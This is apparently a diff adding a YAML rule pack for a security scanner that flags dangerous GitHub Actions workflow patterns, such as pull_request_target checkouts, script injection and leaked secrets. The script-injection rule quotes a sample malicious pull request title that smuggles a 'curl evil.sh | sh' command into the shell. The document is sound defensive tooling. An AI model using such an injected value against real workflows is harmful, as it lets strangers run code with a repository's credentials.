@@ -1,0 +1,209 @@
+# CI and build pipeline pack.
+#
+# Currently the most actively exploited surface in the industry, and the most
+# mechanically checkable: workflow files are structured, and the dangerous
+# shapes are well known and few.
+
+- id: ci/unpinned-third-party-action
+  name: Third-party action pinned to a mutable ref
+  domain: supply-chain
+  severity: high
+  confidence: firm
+  tests: report
+  tier: immediate
+  cwe: CWE-829
+  owasp: A08:2021
+  files: ['**/.github/workflows/*.yml', '**/.github/workflows/*.yaml']
+  parse: yaml
+  for_each: jobs.*.steps[*]
+  assert:
+    all:
+      - path: uses
+        matches: '^[^./][^/]*/[^@]+@(?![0-9a-f]{40}$)'
+      - path: uses
+        not_matches: '^(actions|github)/'
+  message: 'Third-party action pinned to a mutable ref: {{uses}}'
+  why: >-
+    A tag or branch can be repointed by whoever owns the repository, at any
+    time and with no notice to you. The next run then executes their new code
+    in a job that holds your secrets and can push to your repository.
+  fix: >-
+    Pin to the full 40-character commit SHA, with the human-readable version in
+    a trailing comment. Dependabot updates SHA pins.
+
+- id: ci/pull-request-target-checkout
+  name: pull_request_target checks out untrusted PR code
+  domain: supply-chain
+  severity: critical
+  confidence: confirmed
+  tests: report
+  tier: immediate
+  cwe: CWE-829
+  owasp: A08:2021
+  files: ['**/.github/workflows/*.yml', '**/.github/workflows/*.yaml']
+  parse: yaml
+  for_each: jobs.*.steps[*]
+  assert:
+    all:
+      - path: uses
+        matches: '^actions/checkout@'
+      - path: with.ref
+        matches: 'github\.event\.pull_request|github\.head_ref|merge'
+      - path: $.on.pull_request_target
+        present: true
+  message: Workflow runs on pull_request_target and checks out the pull request head
+  why: >-
+    pull_request_target runs with the base repository's secrets and a writable
+    token, unlike pull_request. Checking out the fork's code in that context
+    means any stranger who opens a pull request can execute code with your
+    credentials. This is the single most exploited CI misconfiguration there is.
+  fix: >-
+    Use the pull_request trigger instead, or keep pull_request_target but do not
+    check out or execute PR code. If you need both, split into two workflows and
+    pass only inert data between them.
+
+- id: ci/script-injection
+  name: Attacker-controlled context interpolated into a shell
+  domain: supply-chain
+  severity: critical
+  confidence: firm
+  tests: report
+  tier: immediate
+  cwe: CWE-94
+  owasp: A03:2021
+  files: ['**/.github/workflows/*.yml', '**/.github/workflows/*.yaml']
+  parse: yaml
+  for_each: jobs.*.steps[*]
+  assert:
+    all:
+      # Enumerate the attacker-controlled *fields*, not the objects that
+      # contain them. `github.event.pull_request.number` is an integer the
+      # attacker does not choose; `.title` is free text they do.
+      - path: run
+        matches: '\$\{\{\s*github\.(head_ref|event\.(head_ref|(issue|pull_request|discussion)\.(title|body)|(comment|review|review_comment)\.body|pull_request\.head\.(ref|label)|pull_request\.head\.repo\.(name|description|default_branch|homepage)|commits\[[^\]]*\]\.(message|author\.(name|email))|head_commit\.(message|author\.(name|email))|workflow_run\.(head_branch|head_commit\.message)|pages\[[^\]]*\]\.page_name))'
+  message: A run step interpolates attacker-controlled github context directly into the shell
+  why: >-
+    Expressions are substituted into the script before the shell sees it, so a
+    pull request title of `a"; curl evil.sh | sh; #` becomes part of the
+    command. The attacker needs no write access, only the ability to open an
+    issue or a pull request.
+  fix: >-
+    Pass the value through an env var and reference it as "$TITLE" inside the
+    script. The shell then treats it as data, never as syntax.
+
+- id: ci/write-all-permissions
+  name: Workflow grants write-all permissions
+  domain: supply-chain
+  severity: high
+  confidence: confirmed
+  tests: report
+  tier: immediate
+  cwe: CWE-250
+  files: ['**/.github/workflows/*.yml', '**/.github/workflows/*.yaml']
+  parse: yaml
+  assert:
+    all:
+      - path: permissions
+        equals: write-all
+  message: Workflow token is granted write-all
+  why: >-
+    Every step, including every third-party action, inherits a token that can
+    push code, alter releases, and change repository settings. One compromised
+    action is then a full repository takeover rather than a contained incident.
+  fix: >-
+    Set `permissions: {contents: read}` at the workflow level and grant
+    individual write scopes only on the jobs that need them.
+
+- id: ci/no-explicit-permissions
+  name: Workflow does not set an explicit permissions block
+  domain: supply-chain
+  severity: medium
+  confidence: tentative
+  cwe: CWE-250
+  files: ['**/.github/workflows/*.yml', '**/.github/workflows/*.yaml']
+  parse: yaml
+  assert:
+    all:
+      - path: jobs
+        present: true
+      - path: permissions
+        present: false
+      - path: jobs.*.permissions
+        present: false
+  message: No explicit permissions block, so the workflow inherits the repository default
+  why: >-
+    The repository default may be read-write, and it can be changed
+    organization-wide without touching this file. An explicit block makes the
+    grant visible in review and immune to that drift.
+  fix: >-
+    Add `permissions: {contents: read}` at the top of the workflow and widen
+    per job where needed.
+
+- id: ci/secret-echoed-to-log
+  name: Secret written to the build log
+  domain: supply-chain
+  severity: high
+  confidence: firm
+  tests: report
+  tier: immediate
+  cwe: CWE-532
+  files: ['**/.github/workflows/*.yml', '**/.github/workflows/*.yaml']
+  parse: yaml
+  for_each: jobs.*.steps[*]
+  assert:
+    all:
+      - path: run
+        matches: '(echo|printf|cat|print)\b[^\n]*\$\{\{\s*secrets\.'
+  message: A run step prints a secret to standard output
+  why: >-
+    GitHub masks known secret values in logs, but masking fails on transformed
+    values such as base64 or a substring, and build logs on a public repository
+    are world-readable and archived.
+  fix: Remove the echo. If you need to confirm a secret is set, test its length rather than printing it.
+
+- id: ci/self-hosted-runner
+  name: Job runs on a self-hosted runner
+  domain: supply-chain
+  severity: medium
+  confidence: tentative
+  cwe: CWE-1188
+  files: ['**/.github/workflows/*.yml', '**/.github/workflows/*.yaml']
+  parse: yaml
+  for_each: jobs.*
+  assert:
+    all:
+      - path: runs-on
+        matches: 'self-hosted'
+  message: Job targets a self-hosted runner
+  why: >-
+    Self-hosted runners are not ephemeral by default, so one job can leave
+    state, credentials, or a backdoor for the next. On a public repository a
+    fork pull request can reach the runner and therefore your network.
+  fix: >-
+    Use ephemeral runners that are destroyed after each job, keep them off the
+    production network, and never enable them for public fork pull requests.
+
+- id: ci/workflow-run-checkout
+  name: workflow_run checks out code from the triggering run
+  domain: supply-chain
+  severity: high
+  confidence: firm
+  tests: report
+  cwe: CWE-829
+  files: ['**/.github/workflows/*.yml', '**/.github/workflows/*.yaml']
+  parse: yaml
+  for_each: jobs.*.steps[*]
+  assert:
+    all:
+      - path: uses
+        matches: '^actions/checkout@'
+      - path: with.ref
+        matches: 'github\.event\.workflow_run'
+      - path: $.on.workflow_run
+        present: true
+  message: Workflow runs on workflow_run and checks out the triggering run's code
+  why: >-
+    workflow_run executes in the base repository context with secrets, and the
+    run that triggered it may have been produced by an untrusted fork. This is
+    pull_request_target's problem wearing a different trigger.
+  fix: Download and treat artifacts from the triggering run as untrusted data, and do not check out or execute its code.
